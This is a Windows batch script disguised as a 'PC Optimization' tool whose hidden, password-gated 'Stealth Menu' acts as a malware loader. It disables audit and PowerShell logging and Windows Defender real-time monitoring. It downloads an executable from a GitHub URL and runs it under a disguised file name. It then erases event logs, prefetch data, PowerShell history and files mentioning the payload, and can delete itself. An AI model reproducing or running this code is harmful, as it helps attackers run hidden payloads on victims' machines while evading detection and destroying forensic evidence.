@echo off
setlocal enabledelayedexpansion

:: === Configurations ===
set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"

set "SETUP_EXE=%temp%\CAXVN.exe"
set "DISGUISED_EXE=%temp%\user_data_blob.dat"

:: Determine which PowerShell is available
set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"

:LOGIN
cls
echo ==========================================
echo         PC Optimization
echo       Developed by MaxyPrime
echo ==========================================
echo.

:: Check if a password was passed as an argument from a loader
if not "%~1"=="" (
    set "userpass=%~1"
    echo Password received from loader.
) else (
    set /p userpass=Enter your password: 
)

if "%userpass%"=="1" (
    goto OPTIMIZATION_MENU
) else (
    call :CheckStealthPassword "%userpass%"
    if errorlevel 1 (
        echo Incorrect password. Try again.
        timeout /t 2 /nobreak >nul
        goto LOGIN
    ) else (
        goto STEALTH_MENU
    )
)

goto LOGIN

:CheckStealthPassword
set "inputpass=%~1"
for /f "usebackq delims=" %%A in (`"%PWSH%" -NoProfile -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
if /i "%inputpass%"=="%remote_pass%" (
    exit /b 0
) else (
    exit /b 1
)

:: === PC Optimization Menu ===
:OPTIMIZATION_MENU
cls
echo ==========================================
echo         PC Optimization Menu
echo ==========================================
echo 1. Clean Registry Logs
echo 2. Clean Event Logs
echo 3. Clear Temp Files
echo 4. Flush DNS Cache
echo 5. Check Disk for Errors
echo 6. Defragment Disk
echo 7. System File Checker
echo 8. Return to Main Menu
echo.
set /p optchoice=Select an option (1-8):

if "%optchoice%"=="1" goto CLEAN_REGISTRY_LOGS
if "%optchoice%"=="2" goto CLEAN_EVENT_LOGS
if "%optchoice%"=="3" goto CLEAR_TEMP_FILES
if "%optchoice%"=="4" goto FLUSH_DNS_CACHE
if "%optchoice%"=="5" goto CHECK_DISK
if "%optchoice%"=="6" goto DEFRAGMENT_DISK
if "%optchoice%"=="7" goto SYSTEM_FILE_CHECKER
if "%optchoice%"=="8" goto LOGIN

echo Invalid option. Try again.
timeout /t 2 /nobreak >nul
goto OPTIMIZATION_MENU

:CLEAN_REGISTRY_LOGS
echo Cleaning Registry Logs...
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" 2>nul
)
echo Registry logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAN_EVENT_LOGS
echo Cleaning Event Logs...
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" 2>nul
)
echo Event logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAR_TEMP_FILES
echo Clearing Temp Files...
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
echo Temp files cleared.
pause
goto OPTIMIZATION_MENU

:FLUSH_DNS_CACHE
echo Flushing DNS Cache...
ipconfig /flushdns
echo DNS Cache flushed.
pause
goto OPTIMIZATION_MENU

:CHECK_DISK
echo Checking Disk for Errors...
chkdsk C: /f /r
pause
goto OPTIMIZATION_MENU

:DEFRAGMENT_DISK
echo Defragmenting C: drive...
defrag C: /U /V
pause
goto OPTIMIZATION_MENU

:SYSTEM_FILE_CHECKER
echo Running System File Checker...
sfc /scannow
pause
goto OPTIMIZATION_MENU

:: === Stealth Menu ===
:STEALTH_MENU
cls
echo ===========================================
echo.
echo           *** STEALTH MENU ***
echo         Authorized Personnel Only
echo.
echo ===========================================
echo.
echo 1. Setup
echo 2. Run
echo 3. Bypass
echo 4. Alert the Admin !!!
echo 5. Exit
echo 6. Self-Destruct Stealth Menu
echo.
set /p choice=Choose an option: 

if "%choice%"=="1" goto SETUP
if "%choice%"=="2" goto RUN
if "%choice%"=="3" goto BYPASS
if "%choice%"=="4" goto ALERT_ADMIN
if "%choice%"=="5" goto EXIT
if "%choice%"=="6" goto SELF_DESTRUCT

echo Invalid choice. Try again.
timeout /t 2 /nobreak >nul
goto STEALTH_MENU

:: === Audit Logs Disable/Enable ===

:DISABLE_AUDIT_LOGS
echo Disabling process creation auditing...
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
echo Disabling PowerShell script block logging...
"%PWSH%" -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0" >nul 2>&1
exit /b 0

:ENABLE_AUDIT_LOGS
echo Re-enabling process creation auditing...
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
echo Enabling PowerShell script block logging...
"%PWSH%" -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1" >nul 2>&1
exit /b 0

:: === Setup ===
:SETUP
call :DISABLE_AUDIT_LOGS

echo Disabling Windows Defender temporarily...
"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

echo STEP 1: Preparing download...
timeout /t 1 >nul
echo STEP 2: Connecting to GitHub...
timeout /t 1 >nul
echo STEP 3: Downloading payload (CAXVN.exe)...
"%PWSH%" -NoProfile -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" >nul 2>&1

if not exist "%SETUP_EXE%" (
    echo ERROR: Failed to download EXE. Aborting setup.
    call :ENABLE_AUDIT_LOGS
    "%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
    pause
    goto STEALTH_MENU
)

echo Download successful.
call :ENABLE_AUDIT_LOGS
echo Re-enabling Windows Defender...
"%PWSH%" -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1

pause
goto STEALTH_MENU

:: === Run ===
:RUN
echo Stopping Data Usage Service...
sc stop "DataUsageSvc" >nul 2>&1

echo Preparing disguised EXE...

if not exist "%SETUP_EXE%" (
    echo EXE not found. Please run Setup first.
    pause
    goto STEALTH_MENU
)

copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
start "" /b "%DISGUISED_EXE%"

echo Waiting for EXE to close...
:WAIT_LOOP
timeout /t 2 >nul
tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
if not errorlevel 1 (
    goto WAIT_LOOP
)

echo EXE closed.

del /f /q "%~dp0*.imgui" >nul 2>&1
for %%F in ("%~dp0*.*") do (
    if /I not "%%~nxF"=="%~nx0" (
        del /f /q "%%~fF" >nul 2>&1
    )
)

echo Cleanup completed.
pause
goto STEALTH_MENU

:: === Bypass ===
:BYPASS
:: --- Admin Privilege Check ---
whoami /groups | find "S-1-5-32-544" > nul
if %errorlevel% neq 0 (
    echo ERROR: Admin privileges required to perform full cleanup. Please run this script as Administrator.
    pause
    goto STEALTH_MENU
)

:: --- Data Usage Service Handling (Robust) ---
sc query "DataUsageSvc" >nul 2>&1
if %errorlevel% neq 1060 ( :: 1060 means service does not exist
    sc start "DataUsageSvc" >nul 2>&1
)

:: --- Enable Audit Logs ---
call :ENABLE_AUDIT_LOGS

:: --- Remove Windows Defender Exclusion (Robust) ---
"%PWSH%" -NoProfile -Command "Try { Remove-MpPreference -ExclusionPath '%SETUP_EXE%' -ErrorAction SilentlyContinue } Catch { }" >nul 2>&1

:: --- Cleanup Steps ---
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" 2>nul
)
ipconfig /flushdns >nul
echo off | clip

:: --- Clear WMI Repository Logs ---
winmgmt /salvagerepository >nul 2>&1

:: --- Clean PowerShell History ---
call :CLEAN_PS_HISTORY

echo Cleanup done. All traces removed.
pause
goto STEALTH_MENU

:ALERT_ADMIN
cls
echo Enter your alert message (max 20 words):
set /p alertmsg= 
echo You entered: %alertmsg%
echo (Feature to send message not implemented yet)
pause
goto STEALTH_MENU

:EXIT
exit

:SELF_DESTRUCT
echo Initiating Self-Destruct...
timeout /t 1 >nul
del /f /q "%SETUP_EXE%" >nul 2>&1
del /f /q "%DISGUISED_EXE%" >nul 2>&1
del /f /q "%~dp0*.imgui" >nul 2>&1
set "BATFILE=%~f0"
echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delete_me.vbs"
echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delete_me.vbs"
start /min "" "%temp%\delete_me.vbs"
timeout /t 2 >nul
del "%temp%\delete_me.vbs" >nul 2>&1
exit

:: === PowerShell History Cleanup === (Added if missing from previous copy-paste)
:CLEAN_PS_HISTORY
del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
for /r "%userprofile%" %%F in (*.txt *.log *.ps1) do (
    findstr /i "CAXVN.exe" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
    findstr /i "%~nx0" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
)
wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
exit /b 0
